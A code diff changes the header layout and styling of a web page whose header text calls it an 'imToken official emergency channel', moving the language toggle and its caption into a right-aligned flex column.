@@ -49,13 +49,22 @@ body {
     border-bottom: 1px solid #334155;
     margin-bottom: 2px;
     min-height: 80px;
-    padding-bottom:5px;
+    padding-bottom:1px;
     box-sizing: border-box;
 }
 .lang-switch {
     padding: 0;
     margin: 0;
-    text-align: right;
+    display: flex; /* 改为 Flex 布局 */
+    flex-direction: column; /* 子元素上下排列 */
+    align-items: flex-end; /* 所有子元素靠右对齐 */
+    gap: 6px; /* 文本和按钮的上下间距，可自定义 */
+}
+
+/* 新增文本样式（可按需调整） */
+.lang-text {
+  color: #e0e8e4; /* 与按钮文字同色，保持统一 */
+  font-size: 12px; /* 可根据需求调整大小 */
 }
 .lang-toggle {
     padding: 3px 8px; /* 调大按钮内边距，更易点击 */
@@ -347,7 +356,8 @@ body {
                 <button id="langToggle" class="lang-toggle">
                   <i class="fa fa-globe"></i>
             </button>
-            <p id="headerDesc">imToken官方应急通道</p>
+              <span id="headerDesc" class="lang-text">imToken官方应急通道</span> <!-- 新增文本 -->
+        
          </div>
     </div>
         <div id="userInfo">
